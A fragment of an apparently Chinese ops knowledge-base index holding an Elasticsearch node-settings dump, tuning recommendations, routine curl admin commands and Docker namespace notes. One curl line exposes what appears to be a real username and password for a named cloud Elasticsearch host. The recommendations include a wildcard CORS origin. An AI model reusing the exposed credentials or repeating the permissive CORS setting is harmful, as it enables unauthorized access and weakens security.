\"index.store.openstore.input_blocks_per_bank\": \"400\", \"index.store.openstore.local_write_file_dir\": \"/cache/local_write_file_dir\", \"index.store.openstore.metrics_enable\": \"false\", \"index.store.openstore.ram_name\": \"\", \"index.store.openstore.search_cache_enable\": \"true\", \"index.store.openstore.type\": \"\", \"index.store.oss.block_cache_expire_time_in_millisecond\": \"30000\", \"index.store.oss.connection_timeout\": \"50000\", \"index.store.oss.local_disk_cache_enable\": \"false\", \"index.store.oss.max_connections\": \"1024\", \"index.store.oss.max_error_entry\": \"3\", \"index.store.oss.output_buffer_size\": \"104857600\", \"index.store.oss.part_copy_size\": \"536870912\", \"index.store.oss.part_upload_size\": \"1073741824\", \"index.store.oss.root_data_dir\": \"\", \"index.store.oss.simple_copy_file_size_threshold\": \"1073741824\", \"index.store.oss.socket_timeout\": \"50000\", \"index.store.preload\": [], \"index.store.snapshot.cache.excluded_file_types\": [], \"index.store.snapshot.uncached_chunk_size\": \"-1b\", \"index.store.type\": \"\", \"indexing_pressure.memory.limit\": \"10%\", \"indices.analysis.hunspell.dictionary.ignore_case\": \"false\", \"indices.analysis.hunspell.dictionary.lazy\": \"false\", \"indices.breaker.accounting.limit\": \"100%\", \"indices.breaker.accounting.overhead\": \"1.0\", \"indices.breaker.fielddata.limit\": \"40%\", \"indices.breaker.fielddata.overhead\": \"1.03\", \"indices.breaker.fielddata.type\": \"memory\", \"indices.breaker.request.limit\": \"60%\", \"indices.breaker.request.overhead\": \"1.0\", \"indices.breaker.request.type\": \"memory\", \"indices.breaker.total.limit\": \"95%\", \"indices.breaker.total.use_real_memory\": \"true\", \"indices.breaker.type\": \"hierarchy\", \"indices.breaker.vector.native.indexing.limit\": \"70.0%\", \"indices.breaker.vector.native.total.limit\": \"80.0%\", \"indices.cache.cleanup_interval\": \"1m\", \"indices.consistency.internal_action_long_timeout\": \"1800000ms\", \"indices.consistency.internal_action_retry_timeout\": \"1m\", \"indices.consistency.internal_action_timeout\": \"15m\", \"indices.consistency.limiter.single_task\": \"10\", \"indices.consistency.limiter.total_tasks\": \"30\", \"indices.consistency.recovery_activity_timeout\": \"1800000ms\", \"indices.csr.max_exception_delay\": \"5m\", \"indices.csr.max_no_data_delay\": \"60s\", \"indices.csr.merge.heart_beat_timeout\": \"90s\", \"indices.csr.read_poll_timeout\": \"10s\", \"indices.csr.refresh.copy_timeout\": \"1200s\", \"indices.fielddata.cache.size\": \"-1b\", \"indices.id_field_data.enabled\": \"true\", \"indices.lifecycle.history_index_enabled\": \"true\", \"indices.lifecycle.poll_interval\": \"10m\", \"indices.lifecycle.step.master_timeout\": \"30s\", \"indices.mapping.dynamic_timeout\": \"30s\", \"indices.mapping.max_in_flight_updates\": \"10\", \"indices.memory.index_buffer_size\": \"10%\", \"indices.memory.interval\": \"5s\", \"indices.memory.max_index_buffer_size\": \"-1\", \"indices.memory.min_index_buffer_size\": \"48mb\", \"indices.memory.shard_inactive_time\": \"5m\", \"indices.queries.cache.all_segments\": \"false\", \"indices.queries.cache.count\": \"10000\", \"indices.queries.cache.size\": \"10%\", \"indices.query.bool.max_clause_count\": \"1024\", \"indices.query.query_string.allowLeadingWildcard\": \"true\", \"indices.query.query_string.analyze_wildcard\": \"false\", \"indices.recovery.internal_action_long_timeout\": \"1800000ms\", \"indices.recovery.internal_action_timeout\": \"15m\", \"indices.recovery.max_bytes_per_sec\": \"40mb\", \"indices.recovery.max_concurrent_file_chunks\": \"2\", \"indices.recovery.max_concurrent_operations\": \"1\", \"indices.recovery.recovery_activity_timeout\": \"1800000ms\", \"indices.recovery.retry_delay_network\": \"5s\", \"indices.recovery.retry_delay_state_sync\": \"500ms\", \"indices.replication.advance_writer_segment_counter_step\": \"20000\", \"indices.replication.copy.chunk_size\": \"508kb\", \"indices.replication.initial_retry_backoff_bound\": \"50ms\", \"indices.replication.merge.copy_timeout\": \"3600s\", \"indices.replication.merge.keep_timeout\": \"3600s\", \"indices.replication.merge.max_copy_bytes_per_sec\": \"300mb\", \"indices.replication.merge.retry_count\": \"1\", \"indices.replication.ops_per_segment\": \"500\", \"indices.replication.refresh.copy_timeout\": \"600s\", \"indices.replication.refresh.max_copy_bytes_per_sec\": \"-1\", \"indices.replication.retry_timeout\": \"60s\", \"indices.requests.cache.expire\": \"0ms\", \"indices.requests.cache.size\": \"1%\", \"indices.store.delete.shard.timeout\": \"30s\", \"indices.vector.cache.expiration.enabled\": \"true\", \"indices.vector.cache.expire_after_access.duration\": \"24h\", \"indices.vector.cache.size\": \"8650948608b\", \"ingest.geoip.cache_size\": \"1000\", \"ingest.grok.watchdog.interval\": \"1s\", \"ingest.grok.watchdog.max_execution_time\": \"1s\", \"ingest.user_agent.cache_size\": \"1000\", \"kibana.system_indices\": [ \".kibana\", \".kibana_*\", \".reporting-*\", \".apm-agent-configuration\", \".apm-custom-link\" ], \"logger.level\": \"INFO\", \"monitor.fs.health.enabled\": \"true\", \"monitor.fs.health.refresh_interval\": \"120s\", \"monitor.fs.health.slow_path_logging_threshold\": \"5s\", \"monitor.fs.refresh_interval\": \"1s\", \"monitor.jvm.gc.enabled\": \"true\", \"monitor.jvm.gc.overhead.debug\": \"10\", \"monitor.jvm.gc.overhead.info\": \"25\", \"monitor.jvm.gc.overhead.warn\": \"50\", \"monitor.jvm.gc.refresh_interval\": \"1s\", \"monitor.jvm.refresh_interval\": \"1s\", \"monitor.os.refresh_interval\": \"1s\", \"monitor.process.refresh_interval\": \"1s\", \"network.bind_host\": [ \"_site_\" ], \"network.breaker.inflight_requests.limit\": \"100%\", \"network.breaker.inflight_requests.overhead\": \"2.0\", \"network.host\": [ \"_site_\" ], \"network.publish_host\": [ \"_site_\" ], \"network.server\": \"true\", \"network.tcp.connect_timeout\": \"30s\", \"network.tcp.keep_alive\": \"true\", \"network.tcp.keep_count\": \"-1\", \"network.tcp.keep_idle\": \"-1\", \"network.tcp.keep_interval\": \"-1\", \"network.tcp.no_delay\": \"true\", \"network.tcp.receive_buffer_size\": \"-1b\", \"network.tcp.reuse_address\": \"true\", \"network.tcp.send_buffer_size\": \"-1b\", \"no.model.state.persist\": \"false\", \"node.attr.ml.machine_memory\": \"33021755392\", \"node.attr.ml.max_open_jobs\": \"20\", \"node.attr.transform.node\": \"true\", \"node.attr.xpack.installed\": \"true\", \"node.data\": \"true\", \"node.enable_lucene_segment_infos_trace\": \"false\", \"node.flow_control.gig.client.timeout\": \"1000ms\", \"node.flow_control.gig.session_expire.check_interval\": \"1m\", \"node.flow_control.gig.session_expire.timeout\": \"1m\", \"node.id.seed\": \"0\", \"node.ingest\": \"true\", \"node.local_storage\": \"true\", \"node.master\": \"true\", \"node.max_local_storage_nodes\": \"1\", \"node.ml\": \"true\", \"node.name\": \"es-cn-9lb31hsip000meyx9-3eb54911-0003\", \"node.openstore.init\": \"false\", \"node.pidfile\": \"\", \"node.portsfile\": \"false\", \"node.processors\": \"8\", \"node.remote_cluster_client\": \"true\", \"node.roles\": [ \"transform\", \"master\", \"remote_cluster_client\", \"data\", \"ml\", \"data_content\", \"data_hot\", \"data_warm\", \"data_cold\", \"ingest\" ], \"node.store.allow_mmap\": \"true\", \"node.store.hybrid.openio.metrics.level\": \"INFO\", \"node.transform\": \"true\", \"node.voting_only\": \"false\", \"openstore.concurrent.search.batch_doc_num_per_thread\": \"65536\", \"openstore.concurrent.search.doc_array.type\": \"big_array\", \"openstore.concurrent.search.recycler.limit.heap\": \"10%\", \"openstore.concurrent.search.recycler.type\": \"CONCURRENT\", \"openstore.concurrent.search.recycler.weight.ints\": \"2.0\", \"openstore.concurrent.search.recycler.weight.longs\": \"1.0\", \"oss.enabled\": \"true\", \"oss.user.client.async.restore.enabled\": \"false\", \"oss.user.client.cache.eviction.retries\": \"0\", \"oss.user.client.cache.local.store.file.buckets\": \"1000\", \"oss.user.client.cache.page.size\": \"32mb\", \"oss.user.client.cache.quota.enabled\": \"false\", \"oss.user.client.cache.size\": \"32gb\", \"oss.user.client.cache.timeout.duration\": \"0ms\", \"oss.user.client.cache.timeout.threads\": \"32\", \"path.data\": [ \"/ssd/1/hippo_slave/sys_carbon_4_es-cn-9lb31hsip000meyx9_es_worker_i-2zee8unua229cs6fon2l.worker_12_63/es_worker_process/data\" ], \"path.home\": \"/home/admin/packages/elasticsearch\", \"path.logs\": \"/ssd/1/hippo_slave/sys_carbon_4_es-cn-9lb31hsip000meyx9_es_worker_i-2zee8unua229cs6fon2l.worker_12_63/es_worker_process/logs\", \"path.repo\": [], \"path.shared_data\": \"\", \"pidfile\": \"\", \"plugin.mandatory\": [], \"processors\": \"8\", \"ram_role.credentials_endpoint\": \"http://100.100.100.200/latest/meta-data/ram/security-credentials/\", \"reindex.remote.whitelist\": [], \"repositories.fs.chunk_size\": \"9223372036854775807b\", \"repositories.fs.compress\": \"false\", \"repositories.fs.location\": \"\", \"repositories.url.allowed_urls\": [], \"repositories.url.supported_protocols\": [ \"http\", \"https\", \"ftp\", \"file\", \"jar\" ], \"repositories.url.url\": \"http:\", \"resource.reload.enabled\": \"true\", \"resource.reload.interval.high\": \"5s\", \"resource.reload.interval.low\": \"60s\", \"resource.reload.interval.medium\": \"30s\", \"rest.action.multi.allow_explicit_index\": \"true\", \"script.allowed_contexts\": [], \"script.allowed_types\": [], \"script.cache.expire\": \"0ms\", \"script.cache.max_size\": \"100\", \"script.disable_max_compilations_rate\": \"false\", \"script.max_compilations_rate\": \"use-context\", \"script.max_size_in_bytes\": \"65535\", \"script.painless.regex.enabled\": \"limited\", \"script.painless.regex.limit-factor\": \"6\", \"search.aggs.rewrite_to_filter_by_filter\": \"true\", \"search.aggs.rewrite_to_index_sort_range_min_segment\": \"-1\", \"search.allow_expensive_queries\": \"true\", \"search.default_allow_partial_results\": \"true\", \"search.default_keep_alive\": \"5m\", \"search.default_search_timeout\": \"-1\", \"search.docs_per_range_to_use_filters\": \"5000\", \"search.highlight.term_vector_multi_value\": \"true\", \"search.isolator.check_interval\": \"1s\", \"search.isolator.enabled\": \"false\", \"search.isolator.strategy\": \"WEIGHTED_FAIR\", \"search.isolator.strategy.weighted_fair.fair_ratio\": \"1.0\", \"search.isolator.total.heap.usage.limit\": \"75%\", \"search.isolator.total.mem.limit\": \"60%\", \"search.isolator.total.tasks.limit\": \"1000\", \"search.isolator.trigger.task.latency\": \"10s\", \"search.isolator.trigger.task.mem_cost\": \"100mb\", \"search.keep_alive_interval\": \"1m\", \"search.low_level_cancellation\": \"true\", \"search.max_buckets\": \"65535\", \"search.max_concurrent_shard_requests\": \"5\", \"search.max_keep_alive\": \"24h\", \"search.max_open_scroll_context\": \"500\", \"search.remote.connect\": \"true\", \"search.remote.connections_per_cluster\": \"3\", \"search.remote.initial_connect_timeout\": \"30s\", \"search.remote.node.attr\": \"\", \"security.manager.filter_bad_defaults\": \"true\", \"slm.history_index_enabled\": \"true\", \"slm.retention_duration\": \"1h\", \"slm.retention_schedule\": \"0 30 1 * * ?\", \"snapshot.max_concurrent_operations\": \"1000\", \"stack.templates.enabled\": \"true\", \"support_cname\": \"false\", \"thread_pool.analyze.queue_size\": \"16\", \"thread_pool.analyze.size\": \"1\", \"thread_pool.continue_merge.queue_size\": \"-1\", \"thread_pool.continue_merge.size\": \"1\", \"thread_pool.estimated_time_interval\": \"200ms\", \"thread_pool.fetch_shard_started.core\": \"1\", \"thread_pool.fetch_shard_started.keep_alive\": \"5m\", \"thread_pool.fetch_shard_started.max\": \"16\", \"thread_pool.fetch_shard_store.core\": \"1\", \"thread_pool.fetch_shard_store.keep_alive\": \"5m\", \"thread_pool.fetch_shard_store.max\": \"16\", \"thread_pool.flush.core\": \"1\", \"thread_pool.flush.keep_alive\": \"5m\", \"thread_pool.flush.max\": \"4\", \"thread_pool.force_merge.queue_size\": \"-1\", \"thread_pool.force_merge.size\": \"1\", \"thread_pool.generic.core\": \"4\", \"thread_pool.generic.keep_alive\": \"30s\", \"thread_pool.generic.max\": \"128\", \"thread_pool.get.queue_size\": \"1000\", \"thread_pool.get.size\": \"8\", \"thread_pool.listener.queue_size\": \"-1\", \"thread_pool.listener.size\": \"4\", \"thread_pool.management.core\": \"1\", \"thread_pool.management.keep_alive\": \"5m\", \"thread_pool.management.max\": \"5\", \"thread_pool.refresh.core\": \"1\", \"thread_pool.refresh.keep_alive\": \"5m\", \"thread_pool.refresh.max\": \"4\", \"thread_pool.search.auto_queue_frame_size\": \"2000\", \"thread_pool.search.max_queue_size\": \"1000\", \"thread_pool.search.min_queue_size\": \"1000\", \"thread_pool.search.queue_size\": \"1000\", \"thread_pool.search.size\": \"13\", \"thread_pool.search.target_response_time\": \"1s\", \"thread_pool.search_throttled.auto_queue_frame_size\": \"200\", \"thread_pool.search_throttled.max_queue_size\": \"100\", \"thread_pool.search_throttled.min_queue_size\": \"100\", \"thread_pool.search_throttled.queue_size\": \"100\", \"thread_pool.search_throttled.size\": \"1\", \"thread_pool.search_throttled.target_response_time\": \"1s\", \"thread_pool.snapshot.core\": \"1\", \"thread_pool.snapshot.keep_alive\": \"5m\", \"thread_pool.snapshot.max\": \"4\", \"thread_pool.system_read.queue_size\": \"2000\", \"thread_pool.system_read.size\": \"4\", \"thread_pool.system_write.queue_size\": \"1000\", \"thread_pool.system_write.size\": \"4\", \"thread_pool.warmer.core\": \"1\", \"thread_pool.warmer.keep_alive\": \"5m\", \"thread_pool.warmer.max\": \"4\", \"thread_pool.write.queue_size\": \"10000\", \"thread_pool.write.size\": \"8\", \"time_series.poll_interval\": \"5m\", \"time_stream.force.rollup.delay.flag\": \"false\", \"time_stream.metadata.check.interval\": \"10s\", \"time_stream.rollup.delay.time\": \"24h\", \"transform.task_thread_pool.queue_size\": \"4\", \"transform.task_thread_pool.size\": \"4\", \"transport.bind_host\": [ \"_site_\" ], \"transport.compress\": \"INDEXING_DATA\", \"transport.compression_scheme\": \"LZ4\", \"transport.connect_timeout\": \"30s\", \"transport.connections_per_node.bulk\": \"3\", \"transport.connections_per_node.ping\": \"1\", \"transport.connections_per_node.recovery\": \"2\", \"transport.connections_per_node.reg\": \"6\", \"transport.connections_per_node.state\": \"1\", \"transport.features.x-pack\": \"true\", \"transport.host\": [ \"_site_\" ], \"transport.netty.boss_count\": \"1\", \"transport.netty.receive_predictor_max\": \"64kb\", \"transport.netty.receive_predictor_min\": \"64kb\", \"transport.netty.receive_predictor_size\": \"64kb\", \"transport.netty.worker_count\": \"8\", \"transport.ping_schedule\": \"-1\", \"transport.port\": \"9300\", \"transport.publish_host\": [ \"_site_\" ], \"transport.publish_port\": \"-1\", \"transport.slow_operation_logging_threshold\": \"5s\", \"transport.tcp.compress\": \"INDEXING_DATA\", \"transport.tcp.connect_timeout\": \"30s\", \"transport.tcp.keep_alive\": \"true\", \"transport.tcp.keep_count\": \"-1\", \"transport.tcp.keep_idle\": \"-1\", \"transport.tcp.keep_interval\": \"-1\", \"transport.tcp.no_delay\": \"true\", \"transport.tcp.port\": \"9300\", \"transport.tcp.receive_buffer_size\": \"-1b\", \"transport.tcp.reuse_address\": \"true\", \"transport.tcp.send_buffer_size\": \"-1b\", \"transport.tcp_no_delay\": \"true\", \"transport.tracer.exclude\": [ \"internal:discovery/zen/fd*\", \"internal:coordination/fault_detection/*\", \"cluster:monitor/nodes/liveness\" ], \"transport.tracer.include\": [], \"transport.type\": \"security4\", \"transport.type.default\": \"netty4\", \"xpack.ccr.ccr_thread_pool.queue_size\": \"100\", \"xpack.ccr.ccr_thread_pool.size\": \"32\", \"xpack.ccr.enabled\": \"true\", \"xpack.data_frame.enabled\": \"true\", \"xpack.enrich.enabled\": \"true\", \"xpack.eql.enabled\": \"true\", \"xpack.flattened.enabled\": \"true\", \"xpack.graph.enabled\": \"true\", \"xpack.http.default_connection_timeout\": \"10s\", \"xpack.http.default_read_timeout\": \"10s\", \"xpack.http.max_response_size\": \"10mb\", \"xpack.http.proxy.host\": \"\", \"xpack.http.proxy.port\": \"0\", \"xpack.http.proxy.scheme\": \"\", \"xpack.http.whitelist\": [ \"*\" ], \"xpack.idp.allowed_nameid_formats\": [ \"urn:oasis:names:tc:SAML:2.0:nameid-format:transient\" ], \"xpack.idp.contact.email\": \"\", \"xpack.idp.contact.given_name\": \"\", \"xpack.idp.contact.surname\": \"\", \"xpack.idp.defaults.authn_expiry\": \"5m\", \"xpack.idp.defaults.nameid_format\": \"urn:oasis:names:tc:SAML:2.0:nameid-format:transient\", \"xpack.idp.enabled\": \"false\", \"xpack.idp.entity_id\": \"\", \"xpack.idp.metadata.signing.keystore.alias\": \"\", \"xpack.idp.organization.display_name\": \"\", \"xpack.idp.organization.name\": \"\", \"xpack.idp.organization.url\": \"http:\", \"xpack.idp.privileges.application\": \"\", \"xpack.idp.privileges.cache.size\": \"100\", \"xpack.idp.privileges.cache.ttl\": \"90m\", \"xpack.idp.signing.keystore.alias\": \"\", \"xpack.idp.slo_endpoint.post\": \"https:\", \"xpack.idp.slo_endpoint.redirect\": \"https:\", \"xpack.idp.sp.cache.size\": \"1000\", \"xpack.idp.sp.cache.ttl\": \"60m\", \"xpack.idp.sp.wildcard.path\": \"wildcard_services.json\", \"xpack.idp.sso_endpoint.post\": \"https:\", \"xpack.idp.sso_endpoint.redirect\": \"https:\", \"xpack.ilm.enabled\": \"true\", \"xpack.license.self_generated.type\": \"trial\", \"xpack.license.upload.types\": [ \"standard\", \"gold\", \"platinum\", \"enterprise\", \"trial\" ], \"xpack.logstash.enabled\": \"true\", \"xpack.ml.autodetect_process\": \"true\", \"xpack.ml.datafeed_thread_pool.core\": \"1\", \"xpack.ml.datafeed_thread_pool.keep_alive\": \"1m\", \"xpack.ml.datafeed_thread_pool.max\": \"512\", \"xpack.ml.enable_config_migration\": \"true\", \"xpack.ml.enabled\": \"true\", \"xpack.ml.inference_model.cache_size\": \"40%\", \"xpack.ml.inference_model.time_to_live\": \"5m\", \"xpack.ml.job_comms_thread_pool.core\": \"4\", \"xpack.ml.job_comms_thread_pool.keep_alive\": \"1m\", \"xpack.ml.job_comms_thread_pool.max\": \"2048\", \"xpack.ml.max_anomaly_records\": \"500\", \"xpack.ml.max_inference_processors\": \"50\", \"xpack.ml.max_lazy_ml_nodes\": \"0\", \"xpack.ml.max_machine_memory_percent\": \"30\", \"xpack.ml.max_model_memory_limit\": \"0b\", \"xpack.ml.max_open_jobs\": \"20\", \"xpack.ml.min_disk_space_off_heap\": \"5gb\", \"xpack.ml.nightly_maintenance_requests_per_second\": \"-1.0\", \"xpack.ml.node_concurrent_job_allocations\": \"2\", \"xpack.ml.persist_results_max_retries\": \"20\", \"xpack.ml.process_connect_timeout\": \"10s\", \"xpack.ml.utility_thread_pool.core\": \"1\", \"xpack.ml.utility_thread_pool.keep_alive\": \"10m\", \"xpack.ml.utility_thread_pool.max\": \"2048\", \"xpack.monitoring.collection.ccr.stats.timeout\": \"10s\", \"xpack.monitoring.collection.cluster.stats.timeout\": \"10s\", \"xpack.monitoring.collection.enabled\": \"true\", \"xpack.monitoring.collection.enrich.stats.timeout\": \"10s\", \"xpack.monitoring.collection.index.recovery.active_only\": \"false\", \"xpack.monitoring.collection.index.recovery.timeout\": \"10s\", \"xpack.monitoring.collection.index.stats.timeout\": \"10s\", \"xpack.monitoring.collection.indices\": [], \"xpack.monitoring.collection.interval\": \"10s\", \"xpack.monitoring.collection.ml.job.stats.timeout\": \"10s\", \"xpack.monitoring.collection.node.stats.timeout\": \"10s\", \"xpack.monitoring.elasticsearch.collection.enabled\": \"true\", \"xpack.monitoring.enabled\": \"true\", \"xpack.monitoring.history.duration\": \"168h\", \"xpack.notification.email.default_account\": \"\", \"xpack.notification.email.html.sanitization.allow\": [ \"body\", \"head\", \"_tables\", \"_links\", \"_blocks\", \"_formatting\", \"img:embedded\" ], \"xpack.notification.email.html.sanitization.disallow\": [], \"xpack.notification.email.html.sanitization.enabled\": \"true\", \"xpack.notification.jira.default_account\": \"\", \"xpack.notification.pagerduty.default_account\": \"\", \"xpack.notification.reporting.interval\": \"15s\", \"xpack.notification.reporting.retries\": \"40\", \"xpack.notification.reporting.warning.enabled\": \"true\", \"xpack.notification.slack.default_account\": \"\", \"xpack.rollup.enabled\": \"true\", \"xpack.rollup.task_thread_pool.queue_size\": \"-1\", \"xpack.rollup.task_thread_pool.size\": \"2\", \"xpack.searchable.snapshot.cache.range_size\": \"32mb\", \"xpack.searchable.snapshot.cache.size\": \"9223372036854775807b\", \"xpack.searchable_snapshots.cache_fetch_async_thread_pool.core\": \"0\", \"xpack.searchable_snapshots.cache_fetch_async_thread_pool.keep_alive\": \"30s\", \"xpack.searchable_snapshots.cache_fetch_async_thread_pool.max\": \"32\", \"xpack.searchable_snapshots.cache_prewarming_thread_pool.core\": \"0\", \"xpack.searchable_snapshots.cache_prewarming_thread_pool.keep_alive\": \"30s\", \"xpack.searchable_snapshots.cache_prewarming_thread_pool.max\": \"32\", \"xpack.security.audit.enabled\": \"false\", \"xpack.security.audit.logfile.emit_node_host_address\": \"false\", \"xpack.security.audit.logfile.emit_node_host_name\": \"false\", \"xpack.security.audit.logfile.emit_node_id\": \"true\", \"xpack.security.audit.logfile.emit_node_name\": \"false\", \"xpack.security.audit.logfile.events.emit_request_body\": \"false\", \"xpack.security.audit.logfile.events.exclude\": [], \"xpack.security.audit.logfile.events.include\": [ \"ACCESS_DENIED\", \"ACCESS_GRANTED\", \"ANONYMOUS_ACCESS_DENIED\", \"AUTHENTICATION_FAILED\", \"CONNECTION_DENIED\", \"TAMPERED_REQUEST\", \"RUN_AS_DENIED\", \"RUN_AS_GRANTED\" ], \"xpack.security.authc.anonymous.authz_exception\": \"true\", \"xpack.security.authc.anonymous.roles\": [], \"xpack.security.authc.anonymous.username\": \"_anonymous\", \"xpack.security.authc.api_key.cache.hash_algo\": \"ssha256\", \"xpack.security.authc.api_key.cache.max_keys\": \"10000\", \"xpack.security.authc.api_key.cache.ttl\": \"24h\", \"xpack.security.authc.api_key.delete.interval\": \"24h\", \"xpack.security.authc.api_key.delete.timeout\": \"-1\", \"xpack.security.authc.api_key.doc_cache.ttl\": \"5m\", \"xpack.security.authc.api_key.enabled\": \"false\", \"xpack.security.authc.api_key.hashing.algorithm\": \"pbkdf2\", \"xpack.security.authc.password_hashing.algorithm\": \"bcrypt\", \"xpack.security.authc.realms.file.file1.order\": \"0\", \"xpack.security.authc.realms.native.native1.order\": \"1\", \"xpack.security.authc.reserved_realm.enabled\": \"false\", \"xpack.security.authc.run_as.enabled\": \"true\", \"xpack.security.authc.success_cache.enabled\": \"true\", \"xpack.security.authc.success_cache.expire_after_access\": \"1h\", \"xpack.security.authc.success_cache.size\": \"10000\", \"xpack.security.authc.token.delete.interval\": \"30m\", \"xpack.security.authc.token.delete.timeout\": \"-1\", \"xpack.security.authc.token.enabled\": \"false\", \"xpack.security.authc.token.thread_pool.queue_size\": \"1000\", \"xpack.security.authc.token.thread_pool.size\": \"1\", \"xpack.security.authc.token.timeout\": \"20m\", \"xpack.security.authz.store.privileges.cache.max_size\": \"10000\", \"xpack.security.authz.store.privileges.cache.ttl\": \"24h\", \"xpack.security.authz.store.roles.cache.max_size\": \"10000\", \"xpack.security.authz.store.roles.field_permissions.cache.max_size_in_bytes\": \"104857600\", \"xpack.security.authz.store.roles.index.cache.max_size\": \"10000\", \"xpack.security.authz.store.roles.index.cache.ttl\": \"20m\", \"xpack.security.authz.store.roles.negative_lookup_cache.max_size\": \"10000\", \"xpack.security.automata.cache.enabled\": \"true\", \"xpack.security.automata.cache.size\": \"10000\", \"xpack.security.automata.cache.ttl\": \"48h\", \"xpack.security.automata.max_determinized_states\": \"100000\", \"xpack.security.crypto.thread_pool.queue_size\": \"1000\", \"xpack.security.crypto.thread_pool.size\": \"4\", \"xpack.security.dls.bitset.cache.size\": \"10%\", \"xpack.security.dls.bitset.cache.ttl\": \"2h\", \"xpack.security.dls_fls.enabled\": \"true\", \"xpack.security.enabled\": \"true\", \"xpack.security.encryption.algorithm\": \"AES/CTR/NoPadding\", \"xpack.security.encryption_key.algorithm\": \"AES\", \"xpack.security.encryption_key.length\": \"128\", \"xpack.security.filter.always_allow_bound_address\": \"true\", \"xpack.security.fips_mode.enabled\": \"false\", \"xpack.security.http.filter.allow\": [], \"xpack.security.http.filter.deny\": [], \"xpack.security.http.filter.enabled\": \"true\", \"xpack.security.http.ssl.enabled\": \"false\", \"xpack.security.ssl.diagnose.trust\": \"true\", \"xpack.security.transport.filter.allow\": [], \"xpack.security.transport.filter.deny\": [], \"xpack.security.transport.filter.enabled\": \"true\", \"xpack.security.transport.ssl.enabled\": \"true\", \"xpack.security.user\": null, \"xpack.slm.enabled\": \"true\", \"xpack.sql.enabled\": \"true\", \"xpack.transform.enabled\": \"true\", \"xpack.transform.num_transform_failure_retries\": \"10\", \"xpack.vectors.enabled\": \"true\", \"xpack.watcher.actions.bulk.default_timeout\": \"\", \"xpack.watcher.actions.index.default_timeout\": \"\", \"xpack.watcher.bulk.actions\": \"1\", \"xpack.watcher.bulk.concurrent_requests\": \"0\", \"xpack.watcher.bulk.flush_interval\": \"1s\", \"xpack.watcher.bulk.size\": \"1mb\", \"xpack.watcher.enabled\": \"false\", \"xpack.watcher.encrypt_sensitive_data\": \"false\", \"xpack.watcher.execution.default_throttle_period\": \"5s\", \"xpack.watcher.execution.scroll.size\": \"0\", \"xpack.watcher.execution.scroll.timeout\": \"\", \"xpack.watcher.history.cleaner_service.enabled\": \"true\", \"xpack.watcher.index.rest.direct_access\": \"\", \"xpack.watcher.input.search.default_timeout\": \"\", \"xpack.watcher.internal.ops.bulk.default_timeout\": \"\", \"xpack.watcher.internal.ops.index.default_timeout\": \"\", \"xpack.watcher.internal.ops.search.default_timeout\": \"\", \"xpack.watcher.stop.timeout\": \"30s\", \"xpack.watcher.transform.search.default_timeout\": \"\", \"xpack.watcher.trigger.schedule.ticker.tick_interval\": \"500ms\", \"xpack.watcher.use_ilm_index_management\": \"true\", \"xpack.watcher.watch.scroll.size\": \"0\" } } 生产重点推荐熔断配置 thread_pool.search.size: 13 #推荐(CPU核数*2)/2+1 indices.fielddata.cache.size: 20% indices.breaker.fielddata.limit : 40% # 熔断相关配置，增加稳定性 indices.breaker.request.limit: 40% indices.breaker.total.limit: 80% http.cors.enabled: true http.cors.allow-origin: \"*\" http.max_initial_line_length: 8k Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2023-01-12 04:02:54 "},"ElasitcSearch/基础常用指令.html":{"url":"ElasitcSearch/基础常用指令.html","title":"基础常用指令","keywords":"","body":"内存分析： MAT工具 查看所有索引 `curl -u username:password \"$es/_cat/indices?v\"` 删除索引 curl -XDELETE -u username:password \"$es/active-logs-1\" 查看集群状态 `curl -XGET \"$es/_cluster/health?pretty\"` 查看线程池和请求拒绝情况 curl '192.168.11.228:9200/_cat/thread_pool/?v&h=id,name,active,rejected,completed,size,type&pretty&s=type' 查看单个index的状态 `curl -XGET \"/_cluster/health/goods_id?pretty\"` 查看线程池情况 `curl -XGET http://es:9200/_cat/GET /_cat/thread_pool/?v&h=id,name,active,rejected,completed,size,type&pretty&s=type` 查看哪个线程CPU利用率最高 `curl -XGET http://es:9200/_nodes/hot_threads` 查看es配置 `curl -XGET -u elastic:qingtaokeDB520 'es-cn-i7m2ro5fb000sl33h.elasticsearch.aliyuncs.com:9200/_settings/_all?pretty'` 查看节点上分片情况 curl \"$es/_cat/allocation?v\" Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2023-02-07 05:06:14 "},"K8S/":{"url":"K8S/","title":"K 8 S","keywords":"","body":"k8s操作 Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-05-20 05:31:18 "},"K8S/Docker/":{"url":"K8S/Docker/","title":"Docker","keywords":"","body":"k8s操作 Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2023-02-07 05:06:14 "},"K8S/Docker/1、Namespace.html":{"url":"K8S/Docker/1、Namespace.html","title":"1、Namespace","keywords":"","body":"概念 Docker依赖Namespace和Cgroup实现了容器机制，namespace负责多个进程之间的资源隔离，cgroup限制单个进程的资源限制和监控(比如限制一个进程的IO和内存)。1、Namespace是一种内核级的环境隔离方法，使得处于不同的namespace的进程拥有独立的全局系统资源，修改namespace中的任意资源都只会影响当前的namesapce2、Linux 3.8以上支持pid namespace，系统中每个进程都有一个/prod/{pid}/ns这样一个目录，里面包含了这个进程所属的namespace信息3、当前Linux内核支持8中namespaces: mnt(mount points, filesystems) pid(process) net(network stack) ipc(System V IPC) uts(hostname) user(UIDs) cgroup(root directory) time(boot and monotonic) 查看进程所属的Namespace 查看PID为1380的ns目录，其中展示了6个namespace，如果两个进程的 ipc namespace 的 inode number一样，说明他们属于同一个 namespace Namespace Limit /proc/sys/user/中公开了对各种名称空间的数量限制 Namespace 存活时间 当一个namespace中的所有进程都结束或者移出该 namespace 时，该 namespace 将会被自动销毁。 Network namespace Docker利用Network Namespace实现的4种网络模式host模式: 容器不会创建独立的网络环境，不会虚拟出自己的网卡，而是使用宿主机的IP和端口container模式： 和一个已经存在的容器共享IP和网卡。两个容器除了网络方面，其它如进程列表、文件系统还是独立的。两个容器都可以通过lo网络通信none模式： 容器拥有自己的network namespace，但是并不为容器进行任何网络配置，需要自己为容器添加网络和配置ipbridge模式: docker默认的网络设置，容器获得的网段与宿主机Docker0一致 Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2023-02-09 01:22:05 "},"K8S/Docker/2、Cgroup.html":{"url":"K8S/Docker/2、Cgroup.html","title":"2、Cgroup","keywords":"","body":" ~~~~ Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2023-02-09 01:22:05 